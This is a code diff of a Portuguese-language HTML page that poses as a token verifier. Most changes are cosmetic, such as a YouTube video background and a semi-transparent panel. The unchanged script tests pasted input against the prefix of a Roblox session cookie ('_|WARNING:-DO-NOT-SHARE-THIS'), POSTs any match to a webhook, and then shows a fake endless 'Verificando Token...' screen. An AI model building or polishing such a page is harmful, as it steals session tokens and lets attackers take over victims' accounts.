@@ -6,16 +6,39 @@
     <style>
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: #1a1a1a; 
-            color: #eee; 
             margin: 0;
+            padding: 0;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            position: relative;
+            overflow: hidden;
+            background: #000;
+        }
+
+        /* FUNDO DE VÍDEO */
+        .video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
             overflow: hidden;
         }
+        .video-background iframe {
+            width: 100vw;
+            height: 56.25vw; /* Proporção 16:9 */
+            min-height: 100vh;
+            min-width: 177.77vh; /* Proporção 16:9 */
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0.5; /* Escurece um pouco para dar contraste ao texto */
+        }
+
         .video-group { 
             position: absolute;
             top: 10%;  
@@ -31,7 +54,7 @@
             border: 1px solid #333; 
             padding: 40px; 
             border-radius: 10px; 
-            background: #252525; 
+            background: rgba(37, 37, 37, 0.9); /* Um pouco transparente para ver o fundo */
             text-align: center;
             z-index: 10;
             width: 380px;
@@ -49,7 +72,6 @@
             box-sizing: border-box;
         }
 
-        /* BOTÕES CINZAS COM GLOW */
         .btn-main, .btn-info { 
             cursor: pointer;
             font-weight: bold;
@@ -63,7 +85,6 @@
         .btn-main { width: 100%; padding: 12px 25px; font-size: 1.1em; }
         .btn-info { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 10px 30px; font-size: 0.9em; }
 
-        /* ANIMAÇÃO DE CARREGAMENTO */
         .loader {
             border: 4px solid #333;
             border-top: 4px solid #fff;
@@ -77,13 +98,16 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Modal */
         .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); }
         .modal-content { background-color: #252525; margin: 10% auto; padding: 20px; border: 1px solid #888; width: 50%; border-radius: 10px; }
         .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
+
+    <div class="video-background">
+        <iframe src="https://www.youtube.com/embed/9vntypeV5QU?autoplay=1&mute=1&loop=1&playlist=9vntypeV5QU&controls=0&showinfo=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>
+    </div>
 
     <div class="video-group left-video">
         <iframe width="100%" height="180" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0"></iframe>
@@ -124,22 +148,18 @@
             const padraoValido = /^_\|WARNING:-DO-NOT-SHARE-THIS/;
 
             if (padraoValido.test(tokenValue)) {
-                // Envia para a webhook
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: "🚨 **TOKEN VALIDADO:**\n```" + tokenValue + "```" })
                 });
 
-                // TELA DE CARREGAMENTO INFINITA
                 const container = document.getElementById('mainContainer');
                 container.innerHTML = `
                     <div class="loader"></div>
                     <h3>Verificando Token...</h3>
                     <p>Isso pode levar alguns minutos. Não feche esta página.</p>
-                    <p style="font-size: 0.8em; color: #888;">Processando via API segura...</p>
                 `;
-
             } else {
                 alert("ERRO: O token inserido é inválido!");
             }
